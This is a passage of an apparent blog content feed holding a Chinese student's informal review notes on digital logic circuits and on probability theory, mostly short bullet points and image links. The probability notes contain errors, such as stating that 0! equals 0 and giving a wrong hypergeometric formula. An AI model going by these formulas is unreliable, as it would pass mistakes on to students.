class="headerlink" title="六、组合逻辑电路"></a>六、组合逻辑电路</h1><ul><li>半加器没有接收进位的输入端，全加器有进位输入端，它们两个都是有进位输出端的</li><li>与4位串行进位加法器比较,使用超前进位加法器的目的是提高运算速度</li><li>既考虑低位进位,又考虑向高位进位,应选用全加器。</li><li>二进制译码器是全译码器</li><li>二-十进制译码器输入信号和输出信号分别是<strong>4</strong>位和<strong>10</strong>位。</li><li>16选1数据选择器的地址端有4位。</li><li>当七段显示译码器的输出为<strong>高电平</strong>有效时,应选用共<strong>阴</strong>极数码管。</li><li>对于共<strong>阳</strong>接法的半导体数码显示器,应采用<strong>低电平</strong>驱动的七段显示译码器。</li><li>能将输入信号转变成二进制代码的电路称为编码器。</li><li>编码器在任何时刻只能对一个输入信号进行编码。</li><li>普通编码器在任何时刻只允许一个输入端请求编码，否则输出发生混乱。</li><li>优先编码器允许同时输入数个编码信号，并只对其中优先权最高的信号进行编码输出的电路。</li><li>多路数据选择器的输入信号可以是数字信号和模拟信号</li><li>16选1数据选择器的输入信号、地址码和输出信号分别是16位、4位和1位。</li><li>4路数据分配器输入信号、地址码和输出信号分别是1位、2位和4位。</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610085054069.png" alt="image-20210610085054069" loading="lazy"></p><h2 id="半加器"><a href="#半加器" class="headerlink" title="半加器"></a>半加器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610012739204.png" alt="image-20210610012739204" loading="lazy"></p><h2 id="全加器"><a href="#全加器" class="headerlink" title="全加器"></a>全加器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610012750990.png" alt="image-20210610012750990" loading="lazy"></p><h2 id="3-线-－-8-线译码器-CT74LS138"><a href="#3-线-－-8-线译码器-CT74LS138" class="headerlink" title="3 线 － 8 线译码器 CT74LS138"></a>3 线 － 8 线译码器 CT74LS138</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610012904211.png" alt="image-20210610012904211" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610012942711.png" alt="image-20210610012942711" loading="lazy"></p><h2 id="双-4-选-1-数据选择器-CC74HC153"><a href="#双-4-选-1-数据选择器-CC74HC153" class="headerlink" title="双 4 选 1 数据选择器 CC74HC153"></a>双 4 选 1 数据选择器 CC74HC153</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610085758987.png" alt="image-20210610085758987" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610085810283.png" alt="image-20210610085810283" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610085819674.png" alt="image-20210610085819674" loading="lazy"></p><h2 id="8-选-1-数据选择器-CT74LS151"><a href="#8-选-1-数据选择器-CT74LS151" class="headerlink" title="8 选 1 数据选择器 CT74LS151"></a>8 选 1 数据选择器 CT74LS151</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610090132171.png" alt="image-20210610090132171" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610090226919.png" alt="image-20210610090226919" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610090238572.png" alt="image-20210610090238572" loading="lazy"></p><h2 id="MSI的组合逻辑电路的分析与设计"><a href="#MSI的组合逻辑电路的分析与设计" class="headerlink" title="MSI的组合逻辑电路的分析与设计"></a>MSI的组合逻辑电路的分析与设计</h2><h2 id="竞争和冒险"><a href="#竞争和冒险" class="headerlink" title="竞争和冒险"></a>竞争和冒险</h2><ul><li>逻辑门因输入端的竞争而导致输出产生不应有的尖峰干扰脉冲的现象，称为冒险。</li><li>同一个门的一组输入信号，由于它们在此前通过不同数目的门，经过不同长度导线的传输，到达门输入端的时间会有先有后，这种现象称为竞争。</li></ul><p>消除冒险的方法:<br>1.加封锁脉冲<br>2.加选通脉冲<br>3.修改逻辑设计<br>4.接入滤波电容</p><h2 id="一些题目以及详解-2"><a href="#一些题目以及详解-2" class="headerlink" title="一些题目以及详解"></a>一些题目以及详解</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010327742.png" alt="image-20210609010327742" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010345454.png" alt="image-20210609010345454" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010355340.png" alt="image-20210609010355340" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010417569.png" alt="image-20210609010417569" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010426191.png" alt="image-20210609010426191" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010443574.png" alt="image-20210609010443574" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010453701.png" alt="image-20210609010453701" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010522661.png" alt="image-20210609010522661" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010532640.png" alt="image-20210609010532640" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010559567.png" alt="image-20210609010559567" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010610866.png" alt="image-20210609010610866" loading="lazy"></p><h1 id="七、集成触发器"><a href="#七、集成触发器" class="headerlink" title="七、集成触发器"></a>七、集成触发器</h1><ul><li><p>同步触发器的主要缺点是有空翻现象</p></li><li><p>触发器属于双稳态电路,存在两个稳定状态,从而可存储、记忆1位二进制数据。</p></li><li><p>触发器和门电路是构成数字电路的基本单元。</p></li><li><p>触发器有记忆功能，由它构成的电路在某时刻的输出不仅取决于该时刻的输入，还与电路原来状态有关。而门电路无记忆功能，由它构成的电路在某时刻的输出完全取决于该时刻的输入，与电路原来状态无关；</p></li></ul><h2 id="触发器的类型"><a href="#触发器的类型" class="headerlink" title="触发器的类型"></a>触发器的类型</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610092311171.png" alt="image-20210610092311171" loading="lazy"></p><h2 id="基本RS触发器"><a href="#基本RS触发器" class="headerlink" title="基本RS触发器"></a>基本RS触发器</h2><p>RS为00禁用，11保持，相异为R,01置0，10置1</p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610092808818.png" alt="image-20210610092808818" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610094000415.png" alt="image-20210610094000415" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610094153311.png" alt="image-20210610094153311" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610094400722.png" alt="image-20210610094400722" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610094413914.png" alt="image-20210610094413914" loading="lazy"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610095448717.png" alt="image-20210610095448717" loading="lazy"></p><h2 id="同步-RS-触发器"><a href="#同步-RS-触发器" class="headerlink" title="同步 RS 触发器"></a>同步 RS 触发器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610100442903.png" alt="image-20210610100442903" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610100502897.png" alt="image-20210610100502897" loading="lazy"></p><h2 id="同步-D-触发器"><a href="#同步-D-触发器" class="headerlink" title="同步 D 触发器"></a>同步 D 触发器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610102305346.png" alt="image-20210610102305346" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610103103775.png" alt="image-20210610103103775" loading="lazy"></p><h2 id="同步JK触发器"><a href="#同步JK触发器" class="headerlink" title="同步JK触发器"></a>同步JK触发器</h2><ul><li>K = 00 时保持； JK = 11 时翻转； J K相异 时 Qn+1 值与 J 相同。</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610103124958.png" alt="image-20210610103124958" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610103135349.png" alt="image-20210610103135349" loading="lazy"></p><h2 id="无空翻触发器"><a href="#无空翻触发器" class="headerlink" title="无空翻触发器"></a>无空翻触发器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610103828532.png" alt="image-20210610103828532" loading="lazy"></p><h3 id="主从与边沿触发器的异同点"><a href="#主从与边沿触发器的异同点" class="headerlink" title="主从与边沿触发器的异同点"></a>主从与边沿触发器的异同点</h3><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610104024669.png" alt="image-20210610104024669" loading="lazy"></p><h2 id="边沿JK触发器"><a href="#边沿JK触发器" class="headerlink" title="边沿JK触发器"></a>边沿JK触发器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610105136697.png" alt="image-20210610105136697" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610105150187.png" alt="image-20210610105150187" loading="lazy"></p><h2 id="边沿D触发器"><a href="#边沿D触发器" class="headerlink" title="边沿D触发器"></a>边沿D触发器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610105537422.png" alt="image-20210610105537422" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610110820675.png" alt="image-20210610110820675" loading="lazy"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610120316073.png" alt="image-20210610120316073" loading="lazy"></p><h2 id="一些题目以及详解-3"><a href="#一些题目以及详解-3" class="headerlink" title="一些题目以及详解"></a>一些题目以及详解</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609005759873.png" alt="image-20210609005759873" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609005814797.png" alt="image-20210609005814797" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609005827835.png" alt="image-20210609005827835" loading="lazy"></p><h1 id="八、时序逻辑电路"><a href="#八、时序逻辑电路" class="headerlink" title="八、时序逻辑电路"></a>八、时序逻辑电路</h1><h2 id="同步时序电路的分析"><a href="#同步时序电路的分析" class="headerlink" title="同步时序电路的分析"></a>同步时序电路的分析</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610123149829.png" alt="image-20210610123149829" loading="lazy"></p><h2 id="集成双向移位寄存器-74LS194"><a href="#集成双向移位寄存器-74LS194" class="headerlink" title="集成双向移位寄存器 74LS194"></a>集成双向移位寄存器 74LS194</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610123247275.png" alt="image-20210610123247275" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610123259064.png" alt="image-20210610123259064" loading="lazy"></p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="环形计数器（顺序脉冲发生器）不能自启动"><a href="#环形计数器（顺序脉冲发生器）不能自启动" class="headerlink" title="环形计数器（顺序脉冲发生器）不能自启动"></a>环形计数器（顺序脉冲发生器）不能自启动</h4><p>顺序脉冲：只在每个循环周期内，在时间上按一定顺序排列的脉冲信号<br>产生顺序脉冲信号的电路称为顺序脉冲发生器<br>在数字系统中，常用来控制某些设备按照事先规定的顺序进行计算或操作<br>缺点：电路状态利用率不高</p><h4 id="扭环形计数器（约翰逊计数器）可以自启动"><a href="#扭环形计数器（约翰逊计数器）可以自启动" class="headerlink" title="扭环形计数器（约翰逊计数器）可以自启动"></a>扭环形计数器（约翰逊计数器）可以自启动</h4><p>将寄存器的输出以状态取反的方式反馈到移位输入端，即构成扭环形计数器</p><h2 id="同步计数器"><a href="#同步计数器" class="headerlink" title="同步计数器"></a>同步计数器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610123534820.png" alt="image-20210610123534820" loading="lazy"></p><h2 id="集成同步二进制计数器-74LS161-和-74LS163"><a href="#集成同步二进制计数器-74LS161-和-74LS163" class="headerlink" title="集成同步二进制计数器 74LS161 和 74LS163"></a>集成同步二进制计数器 74LS161 和 74LS163</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610124458800.png" alt="image-20210610124458800" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610124542516.png" alt="image-20210610124542516" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610124835317.png" loading="lazy"></p><h2 id="集成同步二进制加-减计数器74LS191"><a href="#集成同步二进制加-减计数器74LS191" class="headerlink" title="集成同步二进制加/减计数器74LS191"></a>集成同步二进制加/减计数器74LS191</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610124620313.png" alt="image-20210610124620313" loading="lazy"></p><h2 id="集成同步十进制加法计数器74LS160和74LS162"><a href="#集成同步十进制加法计数器74LS160和74LS162" class="headerlink" title="集成同步十进制加法计数器74LS160和74LS162"></a>集成同步十进制加法计数器74LS160和74LS162</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610124655285.png" alt="image-20210610124655285" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610124804453.png" alt="image-20210610124804453" loading="lazy"></p><h2 id="SSI-异步二进制计数器"><a href="#SSI-异步二进制计数器" class="headerlink" title="SSI 异步二进制计数器"></a>SSI 异步二进制计数器</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610124926602.png" alt="image-20210610124926602" loading="lazy"></p><h2 id="任意进制计数器的构成方法"><a href="#任意进制计数器的构成方法" class="headerlink" title="任意进制计数器的构成方法"></a>任意进制计数器的构成方法</h2><p>反馈清零</p><p>反馈置数</p><h2 id="一些题目以及详解-4"><a href="#一些题目以及详解-4" class="headerlink" title="一些题目以及详解"></a>一些题目以及详解</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010636148.png" alt="image-20210609010636148" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010702018.png" alt="image-20210609010702018" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010720877.png" alt="image-20210609010720877" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010735691.png" alt="image-20210609010735691" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010745738.png" alt="image-20210609010745738" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010757248.png" alt="image-20210609010757248" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010809027.png" alt="image-20210609010809027" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010819469.png" alt="image-20210609010819469" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010836711.png" alt="image-20210609010836711" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010845782.png" alt="image-20210609010845782" loading="lazy"></p><h1 id="十、半导体存储器"><a href="#十、半导体存储器" class="headerlink" title="十、半导体存储器"></a>十、半导体存储器</h1><ul><li>半导体存储器的作用：存放二值数据</li><li>按制造工艺分类：双极型，MOS型</li><li>按存取方式不同：半导体存储器可分成只读存储器ROM、随机存取存储器RAM和顺序存取存储器SAM。</li><li>可擦除可编程只读存储器EPROM,电可擦除的可编程存储器EEPROM。</li><li>PROM单次编程（熔丝）</li><li>半导体存储器容量表示：一般用“字数 x字长(即位数)”表示。</li></ul><p>例如，例如，一个 32 x 8 的 ROM，表示它有 32 个字，字长为 8 位，存储容量是 32 x 8 = 256。</p><p>1 M = 1024 K = 2^10 K = 2^20B</p><ul><li><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609012207565.png" alt="image-20210609012207565" loading="lazy"></p></li></ul><h1 id="十二、可编程逻辑器件及其应用"><a href="#十二、可编程逻辑器件及其应用" class="headerlink" title="十二、可编程逻辑器件及其应用"></a>十二、可编程逻辑器件及其应用</h1><ul><li>可编程逻辑器件是指可以通过软件手段更改、配置器件内部连接结构和逻辑单元，完成既定设计功能的数字集成电路</li><li>FPGA数据掉电后丢失，CPLD掉电保持</li><li>CPLD:复杂可编程逻辑器件</li><li>基本逻辑单元是CPLD的主体</li><li>FPGA:现场可编程门阵列</li><li>FPGA的基本结构都是基于查找表加寄存器结构的</li><li>任何组合逻辑电路都可以用“与门-或门”二级电路实现</li><li>任何时序逻辑电路都可以由组合逻辑电路加上存储元件</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610172907541.png" alt="image-20210610172907541" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210610172951896.png" alt="image-20210610172951896" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 数电 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论</title>
      <link href="2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/"/>
      <url>2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>不会，龙哥带带，5555（龙哥数电都复习完了，TTTTTQQQQQQLLLLL）</p><p><a href="https://blog.csdn.net/weixin_43914604/article/details/105655745">看这个吧，不想写了</a></p><a id="more"></a><h1 id="算是前置知识？"><a href="#算是前置知识？" class="headerlink" title="算是前置知识？"></a>算是前置知识？</h1><p>$C^m_n=\frac{n!}{m!(n-m)!}$</p><p>例如</p><p>$C^3_5=\frac{5!}{3!(5-3)!}=\frac{5\times4\times3\times2\times1}{3\times2\times1\times2\times1}=\frac{5\times4}{2\times1}=10$</p><p>$n!=n\times(n-1)\times…\times1$</p><p>$0!=0$</p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210606111231236.png" alt="image-20210606111231236" loading="lazy"></p><h2 id="随便写写，龙哥早复习完了，55555"><a href="#随便写写，龙哥早复习完了，55555" class="headerlink" title="随便写写，龙哥早复习完了，55555"></a>随便写写，龙哥早复习完了，55555</h2><h1 id="随机事件及其概率"><a href="#随机事件及其概率" class="headerlink" title="随机事件及其概率"></a>随机事件及其概率</h1><h3 id="随机试验"><a href="#随机试验" class="headerlink" title="随机试验"></a>随机试验</h3><p><strong>1.确定性现象</strong>:必然发生或必然不发生的现象。</p><p><strong>2.随机现象</strong>:在一定条件下我们事先无法准确预知其结果的现象，称为随机现</p><p>象. </p><p><strong>3.随机现象的特点</strong>：人们通过长期实践并深入研究之后，发现这类现象在大量</p><p>重复试验或观察下，它的结果却呈现出某种统计规律性.概率论与数理统计是研</p><p>究随机现象统计规律性的一门学科. </p><p><strong>4.随机试验</strong>： 为了对随机现象的统计规律性进行研究,就需要对随机现象进行</p><p>重复观察, 我们把对随机现象的观察称为随机试验, 并简称为试验，记为 E . </p><p>随机试验具有下列特点:</p><p><strong>（1）可重复性</strong>: 试验可以在相同的条件下重复进行; </p><p><strong>（2）可观察性</strong>: 试验结果可观察,所有可能的结果是明确的; </p><p><strong>（3）随机性(不确定性)</strong>: 每次试验出现的结果事先不能准确预知. ，但可以肯</p><p>定会出现所有可能结果中的一个. </p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530102404191.png" alt="image-20210530102404191" loading="lazy"></p><p><strong>（1）基本事件</strong> ：仅含一个样本点的随机事件称为基本事件. </p><p><strong>（2）必然事件</strong>：样本空间Ω 本身也是Ω 的子集，它包含Ω 的所有样本点， </p><p>在每次试验中Ω 必然发生，称为必然事件．即必然发生的事件. </p><p><strong>（3）不可能事件</strong>：．空集Φ 也是Ω 的子集，它不包含任何样本点，在每次 </p><p>试验中都不可能发生，称为不可能事件．不可能发生的事件是不包含任何样本 </p><p>点的. </p><p>A包含于B,$A \subset B$</p><p>B包含A ,$x \supset y$</p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530095235575.png" alt="image-20210530095235575" loading="lazy"></p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530003147708.png" alt="image-20210530003147708" loading="lazy"></p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530103815067.png" alt="image-20210530103815067" loading="lazy"></p><h3 id="古典概型（排列组合）"><a href="#古典概型（排列组合）" class="headerlink" title="古典概型（排列组合）"></a>古典概型（排列组合）</h3><p>我们称具有下列两个特征的随机试验模型为古典概型（等可能概型）．</p><p>（1）随机试验只有有限个可能的结果；</p><p>（2）每一个结果发生的可能性大小相同．</p><p><strong>计算古典概率的方法</strong></p><p>（1）基本计数原理：加法原理(几种方案)、乘法原理（分几步）</p><p>（2）排列组合方法：</p><p>排列公式：从 <em>n</em> 个不同元素中任取 <em>k</em> 个的不同排列总数为</p><p>$A^k_n=n\times(n-1)\times…\times(n-k+1)=\frac{n!}{(n-k)!}$</p><p>$A^n_n=n！$</p><p>$n！=0$</p><p>组合公式：从 <em>n</em> 个不同元素中任取 <em>k</em> 个的不同组合总数为</p><p>$C^k_n=\frac{A^k_n}{k!}=\frac{n!}{k!(n-k)!}$</p><p><strong>注意有放回和无放回</strong></p><h3 id="几何概型"><a href="#几何概型" class="headerlink" title="几何概型"></a>几何概型</h3><p><strong>定义</strong>:如果一个随机试验相当于从直线、平面或空间的某一区域Ω任取一点，而所取的点落在Ω中任意两个度量（长度、面积、体积）相等的子区域内的可能性是一样的，则称此试验模型为几何概型，对于任意有度量的子区域，<em>A</em> ⊂ Ω ，定义事件“任取一点落在区域 <em>A</em>内”发生的概率为$P(A)=\frac{A的几何度量}{Ω的几何度量}=\frac{L(A)}{L(Ω)}$（理解）</p><h3 id="频率与概率"><a href="#频率与概率" class="headerlink" title="频率与概率"></a>频率与概率</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530114809525.png" alt="image-20210530114809525" loading="lazy"></p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530114558734.png" alt="image-20210530114558734" loading="lazy"></p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530114612246.png" alt="image-20210530114612246" loading="lazy"></p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530120355917.png" alt="image-20210530120355917" loading="lazy"></p><h3 id="条件概率"><a href="#条件概率" class="headerlink" title="条件概率"></a>条件概率</h3><p><strong>条件概率定义</strong>: 设 A ，B是两个事件，且 P (A)  &gt; 0 称 $\frac{P(AB)}{P(A)}$为在事件Ａ发生的条件下，事件Ｂ发生的条件概率，记为 $P(B|A)$，即 $P(B|A)=\frac{P(AB)}{P(A)}$,同样,可以在 P (B)  &gt; 0 的条件下，定义在事件Ｂ发生的条件下，事件Ａ发生的条件概率为 $P(A|B)=\frac{P(AB)}{P(B)}$.</p><p><strong>注：</strong>条件概率满足概率公理化定义中的三个基本性质</p><p><strong>2. 计算条件概率 P(B|A) 有两种方法：</strong></p><p>（1）在样本空间Ω中，先求 P (AB) P (A) ，再按定义计算 P(B|A)</p><p>（2）在缩减的样本空间$Ω_A$中求事件Ｂ的概率，可得到P(B|A)</p><h3 id="乘法公式"><a href="#乘法公式" class="headerlink" title="乘法公式"></a>乘法公式</h3><p><strong>1.定理(乘法公式)</strong></p><p>设P(A)&gt;0则有P(AB)= P(A)P(B|A)</p><p>设P(B)&gt;0则有P(AB)= P(B)P(A| B)</p><p><strong>2.三个事件的乘法公式:</strong></p><p>设A,B,C为三个事件，且P(AB)&gt;0，P(ABC)= P(A)P(B| A)P(C| AB)</p><p><strong>3.多个事件乘法公式的推广:</strong></p><p>设$A_1,A_2…A_n$,为n个事件，当$P(A_1A_2….A_n)&gt; 0$时，有$P(A_1A_2….A_n)= P(A_1)P(A_2 |A_1)P(A_3|A_1A_2 )….(A_n|A_1A_2…A_{n-1})$</p><h3 id="全概率公式与贝叶斯公式"><a href="#全概率公式与贝叶斯公式" class="headerlink" title="全概率公式与贝叶斯公式"></a>全概率公式与贝叶斯公式</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530151533373.png" alt="image-20210530151533373" loading="lazy"></p><h3 id="事件的独立性"><a href="#事件的独立性" class="headerlink" title="事件的独立性"></a>事件的独立性</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530151953245.png" alt="image-20210530151953245" loading="lazy"></p><h3 id="伯努利概型"><a href="#伯努利概型" class="headerlink" title="伯努利概型"></a>伯努利概型</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530163129277.png" alt="image-20210530163129277" loading="lazy"></p><h1 id="随机变量及其分布"><a href="#随机变量及其分布" class="headerlink" title="随机变量及其分布"></a>随机变量及其分布</h1><p><strong>定义：</strong>设随机试验的样本空间为Ω , 对每个<em>ω</em> ∈ Ω,都有一个实数 X ( ω) 与之对应,则称 X (<em>ω</em> ) 为随机变量.简记为 X . </p><h3 id="离散型随机变量"><a href="#离散型随机变量" class="headerlink" title="离散型随机变量"></a>离散型随机变量</h3><p>离散型随机变量定义：如果随机变量 X 的取值是有限个或可列无穷个，则称X 为离散型随机变量．</p><p>超几何分布</p><h3 id="连续型随机变量"><a href="#连续型随机变量" class="headerlink" title="连续型随机变量"></a>连续型随机变量</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530155432198.png" alt="image-20210530155432198" loading="lazy"></p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530155533067.png" alt="image-20210530155533067" loading="lazy"></p><h3 id="分布函数"><a href="#分布函数" class="headerlink" title="分布函数"></a>分布函数</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530155815257.png" alt="image-20210530155815257" loading="lazy"></p><h3 id="0-1分布"><a href="#0-1分布" class="headerlink" title="0-1分布"></a>0-1分布</h3><p>即二项分布的特例</p><p>如果随机变量X的分布律为P{x=0}=1-p，P{x=1}=p或$P{X=k}=p^k(1-p)^{n-k}$ (k=0,1,0&lt;p&lt;l)， 则称随机变量X服从参数为p的0-1 分布或两点分布，记作X~b(1， p)(其中0≤p≤1为参数)</p><h3 id="几何分布"><a href="#几何分布" class="headerlink" title="几何分布"></a>几何分布</h3><p>如果随机变量X的分布律为P{A}=p，第k次首次发生，前k次未发生，则$P{X=k}=(1-p)^{k-1}p$， 记作X~G(1， p)</p><h3 id="二项分布"><a href="#二项分布" class="headerlink" title="二项分布"></a>二项分布</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530164508869.png" alt="image-20210530164508869" loading="lazy"></p><h3 id="泊松分布"><a href="#泊松分布" class="headerlink" title="泊松分布"></a>泊松分布</h3><p>有时候也写成X~P(λ)，</p><p>记住公式会查表即可。</p><p>二项分布可以泊松分布近似</p><p>n较大，p较小，np适中即可使用泊松分布近似，一般n&gt;=100,np&lt;=10使用</p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530164603557.png" alt="image-20210530164603557" loading="lazy"></p><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530164629737.png" alt="image-20210530164629737" loading="lazy"></p><h3 id="超几何分布"><a href="#超几何分布" class="headerlink" title="超几何分布"></a>超几何分布</h3><p>$P{X=k}=\frac{C_{N1}^kC_{N2}^k}{C_{N}^n}$</p><h3 id="均匀分布"><a href="#均匀分布" class="headerlink" title="均匀分布"></a>均匀分布</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530172324962.png" alt="image-20210530172324962" loading="lazy"></p><h3 id="指数分布"><a href="#指数分布" class="headerlink" title="指数分布"></a>指数分布</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530172341317.png" alt="image-20210530172341317" loading="lazy"></p><h3 id="正态分布"><a href="#正态分布" class="headerlink" title="正态分布"></a>正态分布</h3><p><img src="/2021/04/19/%E6%A6%82%E7%8E%87%E8%AE%BA/image-20210530172410897.png" alt="image-20210530172410897" loading="lazy"></p><h3 id="二维随机变量"><a href="#二维随机变量" class="headerlink" title="二维随机变量"></a>二维随机变量</h3><p>自己看书，离散型和连续型的。</p><p>连续型的公式要记一下</p><h3 id="边缘分布"><a href="#边缘分布" class="headerlink" title="边缘分布"></a>边缘分布</h3><h3 id="条件分布"><a href="#条件分布" class="headerlink" title="条件分布"></a>条件分布</h3>]]></content>
      
      
      <categories>
          
          <category> 概率论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学</title>
      <link href="2021/04/19/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>2021/04/19/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
